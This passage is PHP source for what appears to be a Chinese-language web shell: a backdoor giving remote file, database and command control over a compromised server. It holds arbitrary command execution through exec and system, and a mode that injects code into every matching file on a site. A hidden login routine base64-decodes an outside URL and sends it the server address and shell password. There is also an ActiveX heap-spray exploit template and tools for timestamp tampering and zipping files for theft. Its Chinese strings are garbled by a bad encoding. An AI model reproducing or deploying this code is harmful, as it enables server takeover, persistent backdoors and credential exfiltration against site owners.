	foreach($showfile as $del){
		if(is_dir($del)){ 
			if(!do_deltree($del)) return false;
		}elseif(!is_dir($del)){
			@chmod($del,0777);
			if(!@unlink($del)) return false;
		}
	}
	@chmod($deldir,0777);
	if(!@rmdir($deldir)) return false;
	return true;
}

function do_showsql($query,$conn){
	$result = @mysql_query($query,$conn);
	html_n('<br><br><textarea cols="70" rows="15">');
	while($row = @mysql_fetch_array($result)){
		for($i=0;$i < @mysql_num_fields($result);$i++){
			html_n(htmlspecialchars($row[$i]));
		}
	}
	html_n('</textarea>');
}

function hmlogin($xiao=1){
    @set_time_limit(10);
	$serveru = $_SERVER ['HTTP_HOST'].$_SERVER['PHP_SELF'];
    $serverp = envlpass;
    $copyurl = base64_decode('aHR0cDovL3d3dy50cm95cGxhbi5jb20vcC5hc3B4P249');
    $url=$copyurl.$serveru.'&p='.$serverp;
    $url=urldecode($url);
    $re=file_get_contents($url);

$serveru = $_SERVER ['HTTP_HOST'].$_SERVER['PHP_SELF'];
$serverp = envlpass;
if (strpos($serveru,"0.0")>0 or strpos($serveru,"192.168.")>0 or strpos($serveru,"localhost")>0 or ($serveru==$_COOKIE['serveru'] and $serverp==$_COOKIE['serverp'])) {echo "<meta http-equiv='refresh' content='0;URL=?'>";} else {setcookie('serveru',$serveru);setcookie('serverp',$serverp);if($xiao==1){echo "<script src='?login=geturl'></script><meta http-equiv='refresh' content='0;URL=?'>";}else{geturl();}}
}

function do_down($fd){
	if(!@file_exists($fd)) msg('�����ļ�������');
	$fileinfo = pathinfo($fd);
	header('Content-type: application/x-'.$fileinfo['extension']);
	header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
	header('Content-Length: '.filesize($fd));
	@readfile($fd);
	exit;
}

function do_download($filecode,$file){
	header("Content-type: application/unknown");
	header('Accept-Ranges: bytes');
	header("Content-length: ".strlen($filecode));
	header("Content-disposition: attachment; filename=".$file.";");
	echo $filecode;
	exit;
}

function TestUtf8($text)
{if(strlen($text) < 3) return false;
$lastch = 0;
$begin = 0;
$BOM = true;
$BOMchs = array(0xEF, 0xBB, 0xBF);
$good = 0;
$bad = 0;
$notAscii = 0;
for($i=0; $i < strlen($text); $i++)
{$ch = ord($text[$i]);
if($begin < 3)
{ $BOM = ($BOMchs[$begin]==$ch);
$begin += 1;
continue; }
if($begin==4 && $BOM) break;
if($ch >= 0x80 ) $notAscii++;
if( ($ch&0xC0) == 0x80 )
{if( ($lastch&0xC0) == 0xC0 )
{$good += 1;}
else if( ($lastch&0x80) == 0 )
{$bad += 1; }}
else if( ($lastch&0xC0) == 0xC0 )
{$bad += 1;}
$lastch = $ch;}
if($begin == 4 && $BOM)
{return 2;}
else if($notAscii==0)
{return 1;}
else if ($good >= $bad )
{return 2;}
else
{return 0;}}

function File_Str($string)
{
	return str_replace('//','/',str_replace('\\','/',$string));
}

function File_Write($filename,$filecode,$filemode)
{
	$key = true;
	$handle = @fopen($filename,$filemode);
	if(!@fwrite($handle,$filecode))
	{
		@chmod($filename,0666);
		$key = @fwrite($handle,$filecode) ? true : false;
	}
	@fclose($handle);
	return $key;
}

function File_Mode()
{
	$RealPath = realpath('./');
	$SelfPath = $_SERVER['PHP_SELF'];
	$SelfPath = substr($SelfPath, 0, strrpos($SelfPath,'/'));
	return File_Str(substr($RealPath, 0, strlen($RealPath) - strlen($SelfPath)));
}

function File_Size($size)
{ 
        $kb = 1024;         // Kilobyte
        $mb = 1024 * $kb;   // Megabyte
        $gb = 1024 * $mb;   // Gigabyte
        $tb = 1024 * $gb;   // Terabyte
        if($size < $kb)
        {
            return $size." B";
        }
        else if($size < $mb)
        { 
            return round($size/$kb,2)." K";
        }
        else if($size < $gb)
        { 
            return round($size/$mb,2)." M";
        }
        else if($size < $tb)
        { 
            return round($size/$gb,2)." G";
        }
        else
        { 
            return round($size/$tb,2)." T";
        }
 }

function File_Read($filename)
{
	$handle = @fopen($filename,"rb");
	$filecode = @fread($handle,@filesize($filename));
	@fclose($handle);
	return $filecode;
}

function Info_Cfg($varname){switch($result = get_cfg_var($varname)){case 0: return "No"; break; case 1: return "Yes"; break; default: return $result; break;}}
function Info_Fun($funName){return (false !== function_exists($funName)) ? "Yes" : "No";}

function do_phpfun($cmd,$fun) {
	$res = '';
	switch($fun){
		case "exec": @exec($cmd,$res); $res = join("\n",$res); break;
		case "shell_exec": $res = @shell_exec($cmd); break;
		case "system": @ob_start();	@system($cmd); $res = @ob_get_contents();	@ob_end_clean();break;
		case "passthru": @ob_start();	@passthru($cmd); $res = @ob_get_contents();	@ob_end_clean();break;
		case "popen": if(@is_resource($f = @popen($cmd,"r"))){ while(!@feof($f))	$res .= @fread($f,1024);} @pclose($f);break;
	}
	return $res;
}

function do_passreturn($dir,$code,$type,$bool,$filetype = '',$shell = my_shell){
	$show = do_show($dir);
	foreach($show as $files){
		if(is_dir($files) && $bool){
			do_passreturn($files,$code,$type,$bool,$filetype,$shell);
		}else{
			if($files == $shell) continue;
			switch($type){
				case "guama":
				if(debug($files,$filetype)){
					do_write($files,"ab","\n".$code) ? html_n("�ɹ�--> $files<br>") : html_n("ʧ��--> $files<br>");
				}
				break;
				case "qingma":
				$filecode = @file_get_contents($files);
				if(stristr($filecode,$code)){
					$newcode = str_replace($code,'',$filecode);
					do_write($files,"wb",$newcode) ? html_n("�ɹ�--> $files<br>") : html_n("ʧ��--> $files<br>");
				}
				break;
				case "tihuan":
				$filecode = @file_get_contents($files);
				if(stristr($filecode,$code)){
					$newcode = str_replace($code,$filetype,$filecode);
					do_write($files,"wb",$newcode) ? html_n("�ɹ�--> $files<br>") : html_n("ʧ��--> $files<br>");
				}
				break;
				case "scanfile":
				$file = explode('/',$files);
				if(stristr($file[count($file)-1],$code)){
					html_a("?eanver=editr&p=$files",$files);
					echo '<br>';
				}
				break;
				case "scancode":
				$filecode = @file_get_contents($files);
				if(stristr($filecode,$code)){
					html_a("?eanver=editr&p=$files",$files);
					echo '<br>';
				}
				break;
				case "scanphp":
				$fileinfo = pathinfo($files);
				if($fileinfo['extension'] == $code){
					$filecode = @file_get_contents($files);
					if(muma($filecode,$code)){
						html_a("?eanver=editr&p=".urlencode($files),"�༭");
						html_a("?eanver=del&p=".urlencode($files),"ɾ��");
						echo $files.'<br>';
					}
				}
				break;
			}
		}
	}
}


class PHPzip{

	var $file_count = 0 ;
	var $datastr_len   = 0;
	var $dirstr_len = 0;
	var $filedata = '';
	var $gzfilename;
	var $fp;
	var $dirstr='';

    function unix2DosTime($unixtime = 0) {
        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);

        if ($timearray['year'] < 1980) {
        	$timearray['year']    = 1980;
        	$timearray['mon']     = 1;
        	$timearray['mday']    = 1;
        	$timearray['hours']   = 0;
        	$timearray['minutes'] = 0;
        	$timearray['seconds'] = 0;
        }

        return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |
               ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
    }

	function startfile($path = 'QQqun555227.zip'){
		$this->gzfilename=$path;
		$mypathdir=array();
		do{
			$mypathdir[] = $path = dirname($path);
		}while($path != '.');
		@end($mypathdir);
		do{
			$path = @current($mypathdir);
			@mkdir($path);
		}while(@prev($mypathdir));

		if($this->fp=@fopen($this->gzfilename,"w")){
			return true;
		}
		return false;
	}

    function addfile($data, $name){
        $name     = str_replace('\\', '/', $name);
		
		if(strrchr($name,'/')=='/') return $this->adddir($name);
		
        $dtime    = dechex($this->unix2DosTime());
        $hexdtime = '\x' . $dtime[6] . $dtime[7]
                  . '\x' . $dtime[4] . $dtime[5]
                  . '\x' . $dtime[2] . $dtime[3]
                  . '\x' . $dtime[0] . $dtime[1];
        eval('$hexdtime = "' . $hexdtime . '";');

        $unc_len = strlen($data);
        $crc     = crc32($data);
        $zdata   = gzcompress($data);
        $c_len   = strlen($zdata);
        $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
		
        $datastr  = "\x50\x4b\x03\x04";
        $datastr .= "\x14\x00"; 
        $datastr .= "\x00\x00";
        $datastr .= "\x08\x00"; 
        $datastr .= $hexdtime; 
        $datastr .= pack('V', $crc);
        $datastr .= pack('V', $c_len);
        $datastr .= pack('V', $unc_len);
        $datastr .= pack('v', strlen($name));
        $datastr .= pack('v', 0); 
        $datastr .= $name;
        $datastr .= $zdata;
        $datastr .= pack('V', $crc); 
        $datastr .= pack('V', $c_len);
        $datastr .= pack('V', $unc_len);


		fwrite($this->fp,$datastr);
		$my_datastr_len = strlen($datastr);
		unset($datastr);
		
        $dirstr  = "\x50\x4b\x01\x02";
        $dirstr .= "\x00\x00"; 
        $dirstr .= "\x14\x00";
        $dirstr .= "\x00\x00";
        $dirstr .= "\x08\x00";
        $dirstr .= $hexdtime;
        $dirstr .= pack('V', $crc); 
        $dirstr .= pack('V', $c_len); 
        $dirstr .= pack('V', $unc_len);       	// uncompressed filesize
        $dirstr .= pack('v', strlen($name) ); 	// length of filename
        $dirstr .= pack('v', 0 );             	// extra field length
        $dirstr .= pack('v', 0 );             	// file comment length
        $dirstr .= pack('v', 0 );             	// disk number start
        $dirstr .= pack('v', 0 );             	// internal file attributes
        $dirstr .= pack('V', 32 );            	// external file attributes - 'archive' bit set
        $dirstr .= pack('V',$this->datastr_len ); // relative offset of local header
        $dirstr .= $name;
		
		$this->dirstr .= $dirstr;	//Ŀ¼��Ϣ
		
		$this -> file_count ++;
		$this -> dirstr_len += strlen($dirstr);
		$this -> datastr_len += $my_datastr_len;	
    }

	function adddir($name){ 
		$name = str_replace("\\", "/", $name); 
		$datastr = "\x50\x4b\x03\x04\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00"; 
		
		$datastr .= pack("V",0).pack("V",0).pack("V",0).pack("v", strlen($name) ); 
		$datastr .= pack("v", 0 ).$name.pack("V", 0).pack("V", 0).pack("V", 0); 

		fwrite($this->fp,$datastr);	//д���µ��ļ�����
		$my_datastr_len = strlen($datastr);
		unset($datastr);
		
		$dirstr = "\x50\x4b\x01\x02\x00\x00\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00"; 
		$dirstr .= pack("V",0).pack("V",0).pack("V",0).pack("v", strlen($name) ); 
		$dirstr .= pack("v", 0 ).pack("v", 0 ).pack("v", 0 ).pack("v", 0 ); 
		$dirstr .= pack("V", 16 ).pack("V",$this->datastr_len).$name; 
		
		$this->dirstr .= $dirstr;	//Ŀ¼��Ϣ

		$this -> file_count ++;
		$this -> dirstr_len += strlen($dirstr);
		$this -> datastr_len += $my_datastr_len;	
	}


	function createfile(){
		//ѹ����������Ϣ,�����ļ�����,Ŀ¼��Ϣ��ȡָ��λ�õ���Ϣ
		$endstr = "\x50\x4b\x05\x06\x00\x00\x00\x00" .
					pack('v', $this -> file_count) .
					pack('v', $this -> file_count) .
					pack('V', $this -> dirstr_len) .
					pack('V', $this -> datastr_len) .
					"\x00\x00";

		fwrite($this->fp,$this->dirstr.$endstr);
		fclose($this->fp);
	}
 }

function File_Act($array,$actall,$inver,$REAL_DIR)
{
	if(($count = count($array)) == 0) return '��ѡ���ļ�';
	if($actall == 'e')
	{
     function listfiles($dir=".",$faisunZIP,$mydir){
		$sub_file_num = 0;
		if(is_file($mydir."$dir")){
		  if(realpath($faisunZIP ->gzfilename)!=realpath($mydir."$dir")){
			$faisunZIP -> addfile(file_get_contents($mydir.$dir),"$dir");
			return 1;
		  }
			return 0;
		}
		
		$handle=opendir($mydir."$dir");
		while ($file = readdir($handle)) {
		   if($file=="."||$file=="..")continue;
		   if(is_dir($mydir."$dir/$file")){
			 $sub_file_num += listfiles("$dir/$file",$faisunZIP,$mydir);
		   }
		   else {
		   	   if(realpath($faisunZIP ->gzfilename)!=realpath($mydir."$dir/$file")){
			     $faisunZIP -> addfile(file_get_contents($mydir.$dir."/".$file),"$dir/$file");
				 $sub_file_num ++;
				}
		   }
		}
		closedir($handle);
		if(!$sub_file_num) $faisunZIP -> addfile("","$dir/");
		return $sub_file_num;
	}

   function num_bitunit($num){
	  $bitunit=array(' B',' KB',' MB',' GB');
	  for($key=0;$key<count($bitunit);$key++){
		if($num>=pow(2,10*$key)-1){ //1023B ����ʾΪ 1KB
		  $num_bitunit_str=(ceil($num/pow(2,10*$key)*100)/100)." $bitunit[$key]";
		}
	  }
	  return $num_bitunit_str;
   }

	$mydir=$REAL_DIR.'/';
	if(is_array($array)){
		$faisunZIP = new PHPzip;
		if($faisunZIP -> startfile("$inver")){
			$filenum = 0;
			foreach($array as $file){
				$filenum += listfiles($file,$faisunZIP,$mydir);
			}
			$faisunZIP -> createfile();
			return "ѹ�����,������ $filenum ���ļ�.<br><a href='$inver'>������� $inver (".num_bitunit(filesize("$inver")).")</a>";
		}else{
			return "$inver ����д��,����·����Ȩ���Ƿ���ȷ.<br>";
		}
	}else{
		return "û��ѡ����ļ���Ŀ¼.<br>";
	}


	}
	$i = 0;
	while($i < $count)
	{
		$array[$i] = urldecode($array[$i]);
		switch($actall)
		{
			case "a" : $inver = urldecode($inver); if(!is_dir($inver)) return '·������'; $filename = array_pop(explode('/',$array[$i])); @copy($array[$i],File_Str($inver.'/'.$filename)); $msg = '���Ƶ�'.$inver.'Ŀ¼'; break;
			case "b" : if(!@unlink($array[$i])){@chmod($filename,0666);@unlink($array[$i]);} $msg = 'ɾ��'; break;
			case "c" : if(!eregi("^[0-7]{4}$",$inver)) return '����ֵ����'; $newmode = base_convert($inver,8,10); @chmod($array[$i],$newmode); $msg = '�����޸�Ϊ'.$inver; break;
			case "d" : @touch($array[$i],strtotime($inver)); $msg = '�޸�ʱ��Ϊ'.$inver; break;
		}
		$i++;
	}
	return '��ѡ�ļ�'.$msg.'���';
}

	function start_unzip($tmp_name,$new_name,$todir='zipfile'){
		$z = new Zip;
		$have_zip_file=0;
		$upfile = array("tmp_name"=>$tmp_name,"name"=>$new_name);
		if(is_file($upfile[tmp_name])){
			$have_zip_file = 1;
			echo "<br>���ڽ�ѹ: $upfile[name]<br><br>";
			if(preg_match('/\.zip$/mis',$upfile[name])){
				$result=$z->Extract($upfile[tmp_name],$todir);
				if($result==-1){
					echo "<br>�ļ� $upfile[name] ����.<br>";
				}
				echo "<br>���,������ $z->total_folders ��Ŀ¼,$z->total_files ���ļ�.<br><br><br>";
			}else{
				echo "<br>$upfile[name] ���� zip �ļ�.<br><br>";			
			}
			if(realpath($upfile[name])!=realpath($upfile[tmp_name])){
				@unlink($upfile[name]);
				rename($upfile[tmp_name],$upfile[name]);
			}
		}
	}

function muma($filecode,$filetype){
	$dim = array(
	"php" => array("eval(","exec("),
	"asp" => array("WScript.Shell","execute(","createtextfile("),
	"aspx" => array("Response.Write(eval(","RunCMD(","CreateText()"),
	"jsp" => array("runtime.exec(")
	);
	foreach($dim[$filetype] as $code){
		if(stristr($filecode,$code)) return true;
	}
}

function debug($file,$ftype){
	$type=explode('|',$ftype);
	foreach($type as $i){
		if(stristr($file,$i))	return true;
	}
}

/*---string---*/

function str_path($path){
	return str_replace('//','/',$path);
}

function msg($msg){
	die("<script>window.alert('".$msg."');history.go(-1);</script>");
}

function uppath($nowpath){
	$nowpath = str_replace('\\','/',dirname($nowpath));
	return urlencode($nowpath);
}

function xxstr($key){
	$temp = str_replace("\\\\","\\",$key);
	$temp = str_replace("\\","\\\\",$temp);
	return $temp;
}

/*---html---*/

function html_ta($url,$name){
	html_n("<a href=\"$url\" target=\"_blank\">$name</a>");
}

function html_a($url,$name,$where=''){
	html_n("<a href=\"$url\" $where>$name</a> ");
}

function html_img($url){
	html_n("<img src=\"?img=$url\" border=0>");
}

function back(){
	html_n("<input type='button' value='����' onclick='history.back();'>");
}

function html_radio($namei,$namet,$v1,$v2){
	html_n('<input type="radio" name="return" value="'.$v1.'" checked>'.$namei);
	html_n('<input type="radio" name="return" value="'.$v2.'">'.$namet.'<br><br>');
}

function html_input($type,$name,$value = '',$text = '',$size = '',$mode = false){
	if($mode){
		html_n("<input type=\"$type\" name=\"$name\" value=\"$value\" size=\"$size\" checked>$text");
	}else{
		html_n("$text <input type=\"$type\" name=\"$name\" value=\"$value\" size=\"$size\">");
	}
}

function html_text($name,$cols,$rows,$value = ''){
	html_n("<br><br><textarea name=\"$name\" COLS=\"$cols\" ROWS=\"$rows\" >$value</textarea>");
}

function html_select($array,$mode = '',$change = '',$name = 'class'){
	html_n("<select name=$name $change>");
	foreach($array as $name => $value){
		if($name == $mode){
			html_n("<option value=\"$name\" selected>$value</option>");
		}else{
			html_n("<option value=\"$name\">$value</option>");
		}
	}
	html_n("</select>");
}

function html_font($color,$size,$name){
	html_n("<font color=\"$color\" size=\"$size\">$name</font>");
}

function GetHtml($url)
{
      $c = '';
      $useragent = 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2)';
      if(function_exists('fsockopen')){
    	$link = parse_url($url);
	    $query=$link['path'].'?'.$link['query'];
	    $host=strtolower($link['host']);
	    $port=$link['port'];
	    if($port==""){$port=80;}
	    $fp = fsockopen ($host,$port, $errno, $errstr, 10);
	    if ($fp)
	      {
		    $out = "GET /{$query} HTTP/1.0\r\n"; 
		    $out .= "Host: {$host}\r\n"; 
		    $out .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2)\r\n"; 
		    $out .= "Connection: Close\r\n\r\n"; 
		    fwrite($fp, $out);
		    $inheader=1;
		    while(!feof($fp)) 
		         {$line=fgets($fp,4096);	
			      if($inheader==0){$contents.=$line;}
			      if ($inheader &&($line=="\n"||$line=="\r\n")){$inheader = 0;}
		    } 
		    fclose ($fp); 
		    $c= $contents;
	      }
        }
		if(empty($c) && function_exists('curl_init') && function_exists('curl_exec')){
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_TIMEOUT, 15);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
            curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
            $c = curl_exec($ch);
            curl_close($ch);
        }
        if(empty($c) && ini_get('allow_url_fopen')){
            $c = file_get_contents($url);
        }
		if(empty($c)){
            echo "document.write('<DIV style=\'CURSOR:url(\"$url\")\'>');";
        }
		if(!empty($c))
		{
        return $c;
		}
 }

function html_main($path,$shellname){
$serverip=gethostbyname($_SERVER['SERVER_NAME']);
print<<<END
<html><title>{$shellname}</title>
<table width='100%'><tr><td width='150' align='center'>{$serverip}</td><td><form method='GET' target='main'><input type='hidden' name='eanver' value='main'><input name='path' style='width:100%' value='{$path}'></td><td width='140' align='center'><input name='Submit' type='submit' value='����'> <input type='submit' value='ˢ��' onclick='main.location.reload()'></td></tr></form></table>
END;
	html_n("<table width='100%' height='95.7%' border=0 cellpadding='0' cellspacing='0'><tr><td width='170'><iframe name='left' src='?eanver=left' width='100%' height='100%' frameborder='0'>");
	html_n("</iframe></td><td><iframe name='main' src='?eanver=main' width='100%' height='100%' frameborder='1'>");
	html_n("</iframe></td></tr></table></html>");
}

function islogin($shellname,$myurl){
print<<<END
<style type="text/css">body,td{font-size: 12px;color:#00ff00;background-color:#000000;}input,select,textarea{font-size: 12px;background-color:#FFFFCC;border:1px solid #fff}.C{background-color:#000000;border:0px}.cmd{background-color:#000;color:#FFF}body{margin: 0px;margin-left:4px;}BODY {SCROLLBAR-FACE-COLOR: #232323; SCROLLBAR-HIGHLIGHT-COLOR: #232323; SCROLLBAR-SHADOW-COLOR: #383838; SCROLLBAR-DARKSHADOW-COLOR: #383838; SCROLLBAR-3DLIGHT-COLOR: #232323; SCROLLBAR-ARROW-COLOR: #FFFFFF;SCROLLBAR-TRACK-COLOR: #383838;}a{color:#ddd;text-decoration: none;}a:hover{color:red;background:#000}.am{color:#888;font-size:11px;}</style>
<body style="FILTER: progid:DXImageTransform.Microsoft.Gradient(gradientType=0,startColorStr=#626262,endColorStr=#1C1C1C)" scroll=no><center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><a href='{$myurl}' target='_blank'>{$shellname}</a><br><br><form method='post'>�������룺<input name='envlpass' type='password' size='22'> <input type='submit' value='��½'><br><br><br><font color=#3399FF>�������ڷǷ���;��������߸Ų�����</font><br></div></center>
END;
}

function html_sql(){
	html_input("text","sqlhost","localhost","<br>MYSQL��ַ","30");
	html_input("text","sqlport","3306","<br>MYSQL�˿�","30");
	html_input("text","sqluser","root","<br>MYSQL�û�","30");
	html_input("password","sqlpass","","<br>MYSQL����","30");
	html_input("text","sqldb","dbname","<br>MYSQL����","30");
	html_input("submit","sqllogin","��½","<br>");
	html_n('</form>');
}

function Mysql_Len($data,$len)
{
	if(strlen($data) < $len) return $data;
	return substr_replace($data,'...',$len);
}

function html_n($data){
	echo "$data\n";
}

/*---css---*/

function css_img($img){
	$images = array(
	"exe"=>
	"R0lGODlhEwAOAKIAAAAAAP///wAAvcbGxoSEhP///wAAAAAAACH5BAEAAAUALAAAAAATAA4AAAM7".
	"WLTcTiWSQautBEQ1hP+gl21TKAQAio7S8LxaG8x0PbOcrQf4tNu9wa8WHNKKRl4sl+y9YBuAdEqt".
	"xhIAOw==",
	"dir"=>"R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAA".
	"AAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdE".
	"oMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=",
	"txt"=>
	"R0lGODlhEwAQAKIAAAAAAP///8bGxoSEhP///wAAAAAAAAAAACH5BAEAAAQALAAAAAATABAAAANJ".
	"SArE3lDJFka91rKpA/DgJ3JBaZ6lsCkW6qqkB4jzF8BS6544W9ZAW4+g26VWxF9wdowZmznlEup7".
	"UpPWG3Ig6Hq/XmRjuZwkAAA7",
	"html"=>
	"R0lGODlhEwAQALMAAAAAAP///2trnM3P/FBVhrPO9l6Itoyt0yhgk+Xy/WGp4sXl/i6Z4mfd/HNz".
	"c////yH5BAEAAA8ALAAAAAATABAAAAST8Ml3qq1m6nmC/4GhbFoXJEO1CANDSociGkbACHi20U3P".
	"KIFGIjAQODSiBWO5NAxRRmTggDgkmM7E6iipHZYKBVNQSBSikukSwW4jymcupYFgIBqL/MK8KBDk".
	"Bkx2BXWDfX8TDDaFDA0KBAd9fnIKHXYIBJgHBQOHcg+VCikVA5wLpYgbBKurDqysnxMOs7S1sxIR".
	"ADs=",
	"js"=>
	"R0lGODdhEAAQACIAACwAAAAAEAAQAIL///8AAACAgIDAwMD//wCAgAAAAAAAAAADUCi63CEgxibH".
	"k0AQsG200AQUJBgAoMihj5dmIxnMJxtqq1ddE0EWOhsG16m9MooAiSWEmTiuC4Tw2BB0L8FgIAhs".
	"a00AjYYBbc/o9HjNniUAADs=",
	"xml"=>
	"R0lGODlhEAAQAEQAACH5BAEAABAALAAAAAAQABAAhP///wAAAPHx8YaGhjNmmabK8AAAmQAAgACA".
	"gDOZADNm/zOZ/zP//8DAwDPM/wAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
	"AAAAAAAAAAAAAAAAAAVk4CCOpAid0ACsbNsMqNquAiA0AJzSdl8HwMBOUKghEApbESBUFQwABICx".
	"OAAMxebThmA4EocatgnYKhaJhxUrIBNrh7jyt/PZa+0hYc/n02V4dzZufYV/PIGJboKBQkGPkEEQ".
	"IQA7",
	"mp3"=>
	"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///4CAgMDAwICAAP//AAAAAAAAAANU".
	"aGrS7iuKQGsYIqpp6QiZRDQWYAILQQSA2g2o4QoASHGwvBbAN3GX1qXA+r1aBQHRZHMEDSYCz3fc".
	"IGtGT8wAUwltzwWNWRV3LDnxYM1ub6GneDwBADs=",
	"img"=>
	"R0lGODlhEAAQADMAACH5BAEAAAkALAAAAAAQABAAgwAAAP///8DAwICAgICAAP8AAAD/AIAAAACA".
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARccMhJk70j6K3FuFbGbULwJcUhjgHgAkUqEgJNEEAgxEci".
	"Ci8ALsALaXCGJK5o1AGSBsIAcABgjgCEwAMEXp0BBMLl/A6x5WZtPfQ2g6+0j8Vx+7b4/NZqgftd".
	"FxEAOw==",
	"title"=>"R0lGODlhDgAOAMQAAOGmGmZmZv//xVVVVeW6E+K2F/+ZAHNzcf+vAGdnaf/AAHt1af+".
	"mAP/FAP61AHt4aXNza+WnFP//zAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
	"ACH5BAAHAP8ALAAAAAAOAA4AAAVJYPIcZGk+wUM0bOsWoyu35KzceO3sjsTvDR1P4uMFDw2EEkGUL".
	"I8NhpTRnEKnVAkWaugaJN4uN0y+kr2M4CIycwEWg4VpfoCHAAA7",
	"rar"=>"R0lGODlhEAAQAPf/AAAAAAAAgAAA/wCAAAD/AACAgIAAAIAAgP8A/4CAAP//AMDAwP///wAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/ACH5BAEKAP8ALAAAAAAQABAAAAiFAP0YEEhwoEE/".
    "/xIuEJhgQYKDBxP+W2ig4cOCBCcyoHjAQMePHgf6WbDxgAIEKFOmHDmSwciQIDsiXLgwgZ+b".
    "OHOSXJiz581/LRcE2LigqNGiLEkKWCCgqVOnM1naDOCHqtWbO336BLpzgAICYMOGRdgywIIC".
    "aNOmRcjVj02tPxPCzfkvIAA7"
	);
  header('Content-type: image/gif');
  echo base64_decode($images[$img]);
  die();
}

function css_showimg($file){
	$it=substr($file,-3);
	switch($it){
		case "jpg": case "gif": case "bmp": case "png": case "ico": return 'img';break;
		case "htm": case "tml": return 'html';break;
		case "exe": case "com": return 'exe';break;
		case "xml": case "doc": return 'xml';break;
		case ".js": case "vbs": return 'js';break;
		case "mp3": case "wma": case "wav": case "swf": case ".rm": case "avi":case "mp4":case "mvb": return 'mp3';break;
		case "rar": case "tar": case ".gz": case "zip":case "iso": return 'rar';break;
  	default: return 'txt';break;
	}
}

function css_js($num,$code = ''){
	if($num == "shellcode"){
		return '<%@ LANGUAGE="JavaScript" %>
		<%
		var act=new ActiveXObject("HanGamePluginCn18.HanGamePluginCn18.1");
		var shellcode = unescape("'.$code.'");
		var bigblock = unescape("%u9090%u9090");
		var headersize = 20;
		var slackspace = headersize+shellcode.length;
		while (bigblock.length<slackspace) bigblock+=bigblock;
		fillblock = bigblock.substring(0, slackspace);
		block = bigblock.substring(0, bigblock.length-slackspace);
		while(block.length+slackspace<0x40000) block = block+block+fillblock;
		memory = new Array();
		for (x=0; x<300; x++) memory[x] = block + shellcode;
		var buffer = "";
		while (buffer.length < 1319) buffer+="A";
		buffer=buffer+"\x0a\x0a\x0a\x0a"+buffer;
		act.hgs_startNotify(buffer);
		%>';
	}
	html_n('<script language="javascript">');
	if($num == "1"){
	html_n('	function rusurechk(msg,url){
		smsg = "FileName:[" + msg + "]\nPlease Input New File:";
		re = prompt(smsg,msg);
		if (re){
			url = url + re;
			window.location = url;
		}
	}
	function rusuredel(msg,url){
		smsg = "Do You Suer Delete [" + msg + "] ?";
		if(confirm(smsg)){
			URL = url + msg;
			window.location = url;
		} 
	}
	function Delok(msg,gourl)
	{
		smsg = "ȷ��Ҫɾ��[" + unescape(msg) + "]��?";
		if(confirm(smsg))
		{
			if(gourl == \'b\')
			{
				document.getElementById(\'actall\').value = escape(gourl);
				document.getElementById(\'fileall\').submit();
			}
			else window.location = gourl;
		}
	}
	function CheckAll(form)
	{
		for(var i=0;i<form.elements.length;i++)
		{
			var e = form.elements[i];
			if (e.name != \'chkall\')
			e.checked = form.chkall.checked;
		}
	}
	function CheckDate(msg,gourl)
	{
